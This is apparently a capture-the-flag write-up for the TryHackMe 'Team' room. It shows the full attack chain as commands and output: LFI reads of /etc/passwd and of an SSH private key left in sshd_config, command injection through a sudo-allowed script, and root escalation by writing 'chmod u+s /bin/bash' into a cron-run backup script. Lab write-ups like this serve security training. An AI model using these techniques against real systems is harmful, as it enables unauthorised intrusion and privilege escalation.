---
tags:
  - THM
  - Linux
  - Easy
  - LFI
  - Leakage
  - Sudo
  - File-Analysis
  - Cron
---
https://tryhackme.com/room/teamcw/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.201.89.165 team.thm
```
# Scanning
```console
$ nmap -p21,22,80 -sV -sC team.thm

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a8:5a:d5:d8:df:0f:12:5d:0d:43:0c:50:47:31:3e:b5 (RSA)
|   256 c2:7e:52:34:82:64:67:87:4a:25:85:05:d1:3b:cc:65 (ECDSA)
|_  256 46:4a:e0:62:75:82:e1:fe:f6:56:1d:c6:ac:ea:a9:70 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Team
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
Found valid subdomains, which happen to contain the same website:
```console
$ gobuster vhost -q --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://team.thm -t 50

Found: www.dev.team.thm Status: 200 [Size: 187]
Found: dev.team.thm Status: 200 [Size: 187]
```
The subdomain is in development and has a link to `/script.php` which accepts a `page` parameter:
```console
$ curl -s 'http://dev.team.thm/'

<html>
 <head>
  <title>UNDER DEVELOPMENT</title>
 </head>
 <body>
  Site is being built<a href=script.php?page=teamshare.php </a>
<p>Place holder link to team share</p>
 </body>
</html>
```
# Exploitation
Found users **dale** and **gyles**, because the website is vulnerable to LFI:
```console
$ curl -s 'http://dev.team.thm/script.php?page=/etc/passwd' | grep 'sh$'

root:x:0:0:root:/root:/bin/bash
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh
ssm-user:x:1003:1005::/home/ssm-user:/bin/sh
ubuntu:x:1004:1007:Ubuntu:/home/ubuntu:/bin/bash
```
Using [Caido](https://caido.io/), found the SSH private key for **dale** in `/etc/ssh/sshd_config`:
```console
$ curl -s 'http://dev.team.thm/script.php?page=/etc/ssh/sshd_config'

...
#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
#NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
#NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
#oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK
#o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP
#zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu
#k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS
#xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S
#0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2
#EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU
#eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v
#7n5VNH7cZBxOeB9S5dNx2zftB+CTPyJ177s+FPQ39PZvfSWIug1cOVxrGliqPVqh4S+V0v
#JWLv38uVQGDnydKck4fCHYRVLgM37gvn49AXEOnjxYcRBelmjQkqStr/qsT8zFCC0Hc7a/
#FoVEU8bmjkDiMUNsSfs1gyjIsp8yf5c8JiOBIjio9f54f8OyPK5OowY2qgLpOcbpjsT58l
#gBojNFzgUn4GlPngA3Ghn8EhdWtICPBv07SX23Ft94J8GQVYXN9LixvCaCksbQNSeMkWs4
#xKivIVPBVL6MLBhpbPra5MQWIHHlsCRVLnWIwatjW19oJSs+dr6hWXWwGtUtLKImmx4rsH
#ftzf8oLErg4ToSiIODFh+lXiXEjCKwAAAAMBAAEAAAGAGQ9nG8u3ZbTTXZPV4tekwzoijb
#esUW5UVqzUwbReU99WUjsG7V50VRqFUolh2hV1FvnHiLL7fQer5QAvGR0+QxkGLy/AjkHO
#eXC1jA4JuR2S/Ay47kUXjHMr+C0Sc/WTY47YQghUlPLHoXKWHLq/PB2tenkWN0p0fRb85R
#N1ftjJc+sMAWkJfwH+QqeBvHLp23YqJeCORxcNj3VG/4lnjrXRiyImRhUiBvRWek4o4Rxg
#Q4MUvHDPxc2OKWaIIBbjTbErxACPU3fJSy4MfJ69dwpvePtieFsFQEoJopkEMn1Gkf1Hyi
#U2lCuU7CZtIIjKLh90AT5eMVAntnGlK4H5UO1Vz9Z27ZsOy1Rt5svnhU6X6Pldn6iPgGBW
#/vS5rOqadSFUnoBrE+Cnul2cyLWyKnV+FQHD6YnAU2SXa8dDDlp204qGAJZrOKukXGIdiz
#82aDTaCV/RkdZ2YCb53IWyRw27EniWdO6NvMXG8pZQKwUI2B7wljdgm3ZB6fYNFUv5AAAA
#wQC5Tzei2ZXPj5yN7EgrQk16vUivWP9p6S8KUxHVBvqdJDoQqr8IiPovs9EohFRA3M3h0q
#z+zdN4wIKHMdAg0yaJUUj9WqSwj9ItqNtDxkXpXkfSSgXrfaLz3yXPZTTdvpah+WP5S8u6
#RuSnARrKjgkXT6bKyfGeIVnIpHjUf5/rrnb/QqHyE+AnWGDNQY9HH36gTyMEJZGV/zeBB7
#/ocepv6U5HWlqFB+SCcuhCfkegFif8M7O39K1UUkN6PWb4/IoAAADBAMuCxRbJE9A7sxzx
#sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb
#mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur
#4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg
#e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S
#2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH
#8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX
#b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7
#CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
#-----END OPENSSH PRIVATE KEY-----
```
Remove the comments and connect as **dale** via SSH:
```console
$ curl -s 'http://dev.team.thm/script.php?page=/etc/ssh/sshd_config' | grep 'BEGIN OPENSSH' -A 40 | sed 's/^#//' > id_rsa

$ chmod 600 id_rsa

$ ssh -i id_rsa dale@team.thm
```
Get the **user flag**:
```bash
cat /home/dale/user.txt
```
# Post-Exploitation
## User migration
We can run `/home/gyles/admin_checks` as **gyles**:
```console
$ sudo -l

Matching Defaults entries for dale on ip-10-201-89-165:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on ip-10-201-89-165:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```
The script executes the `$error` variable as command:
```bash
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```
We can not modify the file, but we can inject commands to become **gyles**:
```console
$ sudo -u gyles /home/gyles/admin_checks

Reading stats.
Reading stats..
Enter name of person backing up the data: 
Enter 'date' to timestamp the file: /bin/bash
The Date is
whoami
gyles
script /dev/null -qc /bin/bash
```
## Privilege escalation
User **gyles** is inside the `editors` and `admin` groups. So, we find files owned by any of these groups:
```console
$ id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)

$ find / -group editors -o -group admin 2>/dev/null
/var/stats/stats.txt
/usr/local/bin
/usr/local/bin/main_backup.sh
/home/gyles/admin_checks
/opt/admin_stuff
```
The `/usr/local/bin/main_backup.sh` script, creates backup of the web server:
```bash
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```
The script is being executed by **root** and we can modify it, so we give **SUID permissions** to the `/bin/bash`:
```console
$ stat -c '%U' /var/backups/www/team.thm/
root

$ ls -l /usr/local/bin/main_backup.sh
-rwxrwxr-x 1 root admin 65 Jan 17  2021 /usr/local/bin/main_backup.sh

$ echo 'chmod u+s /bin/bash' > /usr/local/bin/main_backup.sh

$ /bin/bash -p
```
Get the **root flag**:
```bash
cat /root/root.txt
```